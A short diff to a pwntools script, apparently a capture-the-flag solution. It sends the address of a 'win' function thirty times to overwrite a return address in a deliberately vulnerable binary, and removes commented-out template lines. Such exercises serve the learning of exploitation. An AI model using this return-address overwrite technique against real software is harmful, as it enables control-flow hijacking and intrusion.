@@ -43,17 +43,10 @@ break vulnerable""".format(
 
 io = start()
 log.info(io.recv())
+# you just send win address until you're sure you 
+# go above the return address. Not too much to prevent segfault
 payload = p64(exe.symbols["win"]) * 30
 log.info(f"Payload {payload}")
 io.sendline(payload)
-
-# shellcode = asm(shellcraft.sh())
-# payload = fit({
-#     32: 0xdeadbeef,
-#     'iaaa': [1, 2, 'Hello', 3]
-# }, length=128)
-# io.send(payload)
-# flag = io.recv(...)
-# log.success(flag)
 
 io.interactive()
